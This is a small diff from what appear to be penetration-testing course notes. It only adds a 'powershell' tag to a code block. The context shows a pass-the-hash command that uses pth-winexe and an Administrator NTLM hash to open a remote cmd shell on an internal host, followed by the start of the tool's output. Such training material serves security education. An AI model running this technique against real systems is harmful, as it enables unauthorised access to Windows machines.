@@ -42,7 +42,7 @@ Examples:
 
 ### PtH
 We can use _pth-winexe_ from the Passing-The-Hash toolkit, just as we did when we passed the hash to a non-domain joined user in the Password Attacks module:
-```
+```powershell
 kali@kali:~$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
 E_md4hash wrapper called.
 HASH PASS: Substituting user supplied NTLM HASH...
